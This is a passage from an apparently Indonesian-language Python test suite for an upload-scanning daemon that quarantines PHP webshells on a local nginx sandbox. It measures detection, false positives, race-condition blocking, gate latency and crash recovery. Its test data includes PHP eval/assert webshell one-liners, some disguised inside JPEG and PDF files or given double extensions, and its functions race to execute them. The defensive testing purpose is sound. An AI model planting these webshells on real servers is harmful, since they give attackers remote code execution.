        ('jpg_tail.jpg', b'\xff\xd8\xff\xe0' + os.urandom(3000) + b'<?php eval($_POST[1]);?>', UP),
        ('pdf_poly.pdf', b'%PDF-1.4\n<?php @assert($_REQUEST["a"]);?>\n', UP),
        ('ganda.php.jpg', b'<?php @eval($_POST["x"]);?>', UP),
        ('di_media.php', b'<?php @eval($_POST["x"]);?>', MEDIA),
    ]
    for nama, isi, dr in JAHAT:
        upload(nama, isi, dir_='media' if dr == MEDIA else None)
    dt = tunggu(lambda: len(antrian()) == len(JAHAT), 30, 0.1)
    lolos = [n for n, _, dr in JAHAT if os.path.exists(dr + '/' + n)]
    T('%d dari %d sampel jahat terdeteksi TANPA clamd (%.1f dtk)' % (len(JAHAT) - len(lolos), len(JAHAT), dt or -1), not lolos, lolos)
    SAH = [
        ('foto.jpg', b'\xff\xd8\xff\xe0' + os.urandom(5000), UP),
        ('gambar.png', b'\x89PNG\r\n\x1a\n' + os.urandom(5000), UP),
        ('laporan.pdf', b'%PDF-1.4\n1 0 obj<<>>endobj\n%%EOF\n', UP),
        ('catatan.txt', b'catatan rapat, ada kata eval dan system tetapi bukan kode\n', UP),
        ('data.json', b'{"a": 1}', UP),
        ('kosong_aman.php', b'<?php echo "halo"; ?>', UP),
        ('class_biasa.php', b'<?php class A { function f($x){ return strtoupper($x); } } ?>', UP),
        ('.htaccess', b'Options -Indexes\nphp_flag engine off\n', MEDIA),
    ]
    reset_karantina(); bersihkan()
    CLAMD_MODE[0] = 'proxy'; shim_clamdscan('normal')      # berkas sah butuh clamd agar penahanan dilepas
    for nama, isi, dr in SAH:
        upload(nama, isi, dir_='media' if dr == MEDIA else None)
    time.sleep(3)
    salah = [n for n, _, dr in SAH if not os.path.exists(dr + '/' + n)]
    T('%d berkas sah (gambar, PDF, teks, PHP biasa, .htaccess aman) TIDAK dikarantina' % len(SAH), not salah and antrian() == [], (salah, antrian()))
    T('berkas sah bermode eksekusi ditahan lalu DIPULIHKAN ke mode semula (bukan 000)', all((os.stat(dr + '/' + n).st_mode & 0o777) != 0 for n, _, dr in SAH if os.path.exists(dr + '/' + n)))
    CLAMD_MODE[0] = 'proxy'; shim_clamdscan('normal'); bersihkan(); bersihkan(MEDIA); reset_karantina()

    # ---------------------------------------------------------------- O. penyerang mengejar berkas
    print('\n## O. Penyerang MENGEJAR webshell yang baru diunggah (eksekusi via nginx+PHP) di folder tanpa blokir WAF')
    N = 40

    def serang_realistis(nama):
        """Seperti penyerang nyata: unggah, baca respons, LANGSUNG minta berkas itu."""
        k, _, b = upload(nama, WEBSHELL_EVAL, dir_='media')
        c = HTTPConnection('127.0.0.1', PORT, timeout=5)
        c.request('GET', '/media/' + nama)
        r = c.getresponse(); body = r.read(); c.close()
        return b'PWNED' in body

    def serang_agresif(nama):
        """Penyerang super cepat: sudah memberondong URL sebelum unggahan selesai."""
        hit = [False]; stop = [False]

        def spam():
            c = HTTPConnection('127.0.0.1', PORT, timeout=5)
            while not stop[0]:
                try:
                    c.request('GET', '/media/' + nama)
                    r = c.getresponse(); body = r.read()
                    if b'PWNED' in body:
                        hit[0] = True
                except Exception:
                    c = HTTPConnection('127.0.0.1', PORT, timeout=5)
        th_ = threading.Thread(target=spam); th_.start()
        time.sleep(0.05)
        upload(nama, WEBSHELL_EVAL, dir_='media')
        time.sleep(0.4)
        stop[0] = True; th_.join()
        return hit[0]

    # kontrol: tanpa pemindai serangan HARUS berhasil (membuktikan uji ini sahih)
    hentikan(d)
    ctrl = sum(serang_realistis('kontrol%d.php' % i) for i in range(5))
    T('KONTROL tanpa pemindai: serangan berhasil mengeksekusi webshell (%d dari 5) -> uji sahih' % ctrl, ctrl >= 4, ctrl)
    bersihkan(MEDIA)
    d = mulai_daemon()
    real = sum(serang_realistis('realis%d.php' % i) for i in range(N))
    T('pemindai aktif, penyerang realistis: webshell dieksekusi %d dari %d percobaan' % (real, N), real == 0, real)
    time.sleep(1); bersihkan(MEDIA); reset_karantina()
    N2 = 100
    agr = sum(serang_agresif('agresif%d.php' % i) for i in range(N2))
    sg = baca_state()
    print('    penyerang agresif (memberondong sebelum unggah selesai), gerbang AKTIF: %d dari %d berhasil; gerbang: %s kejadian, %s menunggu putusan, %s ditolak' % (agr, N2, sg.get('stat_gate_events'), sg.get('stat_gate_wait'), sg.get('stat_gate_deny')))
    T('pemindai + gerbang aktif, penyerang AGRESIF: tidak ada eksekusi (%d dari %d)' % (agr, N2), agr == 0, agr)
    T('gerbang benar-benar bekerja: kernel menunggu putusan untuk berkas eksekusi (gate_wait > 0)', int(sg.get('stat_gate_wait', 0)) > 0, sg)
    time.sleep(1); bersihkan(MEDIA); reset_karantina()
    tulis_conf({'zytest': True}, onaccess_block=False)       # dimatikan LANGSUNG, tanpa restart daemon
    dt = tunggu(lambda: baca_state().get('stat_gate_on') == '0', 12, 0.2)
    T('gerbang dapat dimatikan lewat konfigurasi tanpa restart (stat_gate_on=0 dalam %.1f dtk)' % (dt or -1), dt is not None, baca_state().get('stat_gate_on'))
    agr0 = sum(serang_agresif('tanpagerbang%d.php' % i) for i in range(N2))
    print('    (pembanding) gerbang DIMATIKAN, hanya penahanan chmod+antrean: %d dari %d berhasil -> gerbang menutup celah ini' % (agr0, N2))
    time.sleep(1); bersihkan(MEDIA); reset_karantina()
    tulis_conf({'zytest': True})
    dt = tunggu(lambda: baca_state().get('stat_gate_on') == '1', 12, 0.2)
    T('gerbang menyala lagi lewat konfigurasi tanpa restart (%.1f dtk)' % (dt or -1), dt is not None, baca_state().get('stat_gate_on'))

    print('\n## R. Biaya gerbang untuk berkas biasa (gambar statis dibaca nginx) dan berkas eksekusi sah')
    open(UP + '/foto_statis.jpg', 'wb').write(b'\xff\xd8\xff\xe0' + os.urandom(50000)); sh('chown www:www %s/foto_statis.jpg' % UP)
    time.sleep(1.5)
    def ukur(n=300):
        v = []
        for _ in range(n):
            c = HTTPConnection('127.0.0.1', PORT, timeout=5); t0 = time.perf_counter()
            c.request('GET', '/uploads/foto_statis.jpg'); r = c.getresponse(); r.read(); v.append((time.perf_counter() - t0) * 1000); c.close()
        return v
    sa = baca_state(); dengan = ukur(); time.sleep(1.2); sb = baca_state()
    hentikan(d); tanpa = ukur(); d = mulai_daemon()
    ev = int(sb.get('stat_gate_events', 0)) - int(sa.get('stat_gate_events', 0))
    print('    300 GET gambar: dengan gerbang p50 %.2f / p95 %.2f ms; tanpa p50 %.2f / p95 %.2f ms; kejadian gerbang %d' % (statistics.median(dengan), pct(dengan, .95), statistics.median(tanpa), pct(tanpa, .95), ev))
    T('gerbang melihat >= 300 pembukaan gambar dan melepasnya seketika (tidak ada yang menunggu putusan)', ev >= 300 and int(sb.get('stat_gate_wait', 0)) == int(sa.get('stat_gate_wait', 0)), (ev, sa.get('stat_gate_wait'), sb.get('stat_gate_wait')))
    T('beban tambahan gerbang pada gambar: p95 selisih < 10 ms', pct(dengan, .95) - pct(tanpa, .95) < 10, (pct(dengan, .95), pct(tanpa, .95)))
    bersihkan()
    upload('sah.php', b'<?php echo "halo-sah";?>', dir_='media')
    time.sleep(0.6)
    c = HTTPConnection('127.0.0.1', PORT, timeout=8); c.request('GET', '/media/sah.php'); r = c.getresponse(); body = r.read(); c.close()
    T('PHP sah di folder upload: setelah putusan bersih bisa dijalankan (200, isi benar)', r.status == 200 and b'halo-sah' in body, (r.status, body[:60]))
    CLAMD_MODE[0] = 'slow'
    upload('sah2.php', b'<?php echo "halo-sah2";?>', dir_='media')
    c = HTTPConnection('127.0.0.1', PORT, timeout=15); t0 = time.time(); c.request('GET', '/media/sah2.php'); r = c.getresponse(); body = r.read(); c.close()
    T('selama clamd macet, berkas eksekusi belum terverifikasi TIDAK bisa dijalankan (tak ada keluaran skrip)', b'halo-sah2' not in body, (r.status, body[:60]))
    CLAMD_MODE[0] = 'proxy'
    dt = tunggu(lambda: (os.stat(MEDIA + '/sah2.php').st_mode & 0o777) != 0, 30, 0.2)
    time.sleep(0.3)
    c = HTTPConnection('127.0.0.1', PORT, timeout=8); c.request('GET', '/media/sah2.php'); r = c.getresponse(); body = r.read(); c.close()
    T('setelah clamd menjawab bersih, berkas yang sama bisa dijalankan (%.1f dtk)' % (dt or -1), dt is not None and b'halo-sah2' in body, (r.status, body[:60]))
    bersihkan(MEDIA); bersihkan(); reset_karantina()

    # ---------------------------------------------------------------- P. clamd pulih saat berkas ditahan
    print('\n## P. clamd mati lalu PULIH: berkas eksekusi ditahan (000) selama gagal, lalu dipindai ulang dan dikarantina')
    hentikan(d); tulis_conf({'zytest': True}, retry_delays=[1, 2, 4, 8, 16]); CLAMD_MODE[0] = 'down'; shim_clamdscan('rusak'); d = mulai_daemon()
    upload('eicar_ditahan.php', EICAR)       # bukan webshell heuristik; hanya clamd yang bisa mengenalinya
    time.sleep(2.5)
    mode_ditahan = oct(os.stat(UP + '/eicar_ditahan.php').st_mode & 0o777) if os.path.exists(UP + '/eicar_ditahan.php') else None
    T('clamd mati: berkas eksekusi yang belum bisa dipindai TETAP DITAHAN (mode 000)', mode_ditahan == '0o0', mode_ditahan)
    CLAMD_MODE[0] = 'proxy'; shim_clamdscan('normal')
    dt = tunggu(lambda: len(antrian()) == 1, 30, 0.2)
    T('clamd pulih: berkas yang ditahan dipindai ulang dan dikarantina (%.1f dtk)' % (dt or -1), dt is not None and not os.path.exists(UP + '/eicar_ditahan.php'), antrian())
    bersihkan(); reset_karantina()

    # ---------------------------------------------------------------- Q. mati saat berkas ditahan
    print('\n## Q. Daemon mati mendadak SAAT berkas ditahan: jurnal memulihkan/memindai saat hidup lagi')
    hentikan(d); tulis_conf({'zytest': True}, retry_delays=[1, 2, 4, 8, 16]); CLAMD_MODE[0] = 'down'; shim_clamdscan('rusak'); d = mulai_daemon()
    upload('sah_ditahan.php', b'<?php echo "halo";?>')
    time.sleep(1.5)
    m1 = oct(os.stat(UP + '/sah_ditahan.php').st_mode & 0o777)
    hentikan(d, keras=True)
    CLAMD_MODE[0] = 'proxy'; shim_clamdscan('normal')
    d = mulai_daemon()
    dt = tunggu(lambda: (os.stat(UP + '/sah_ditahan.php').st_mode & 0o777) != 0, 20, 0.2)
    T('saat mati berkas berstatus 000; setelah hidup lagi dipindai dan mode semula dipulihkan (%s -> %s)' % (m1, oct(os.stat(UP + '/sah_ditahan.php').st_mode & 0o777)), m1 == '0o0' and dt is not None and (os.stat(UP + '/sah_ditahan.php').st_mode & 0o777) != 0, (m1, dt))
    bersihkan(); reset_karantina()
finally:
    for p in PROC:
        try: hentikan(p)
        except Exception: pass
    try:
        pid = int(open(SB + '/nginx.pid').read()); os.kill(pid, signal.SIGTERM)
    except Exception:
        pass
    time.sleep(1)
    sh('pkill -TERM -f "[i]notifywait.*%s"' % SB)
    sh('pkill -TERM -f "[s]leep 100000"')
    shutil.rmtree(SB, ignore_errors=True)
print('\nRINGKAS: %d gagal dari %d' % (gagal, len(HASIL)))
sys.exit(1 if gagal else 0)
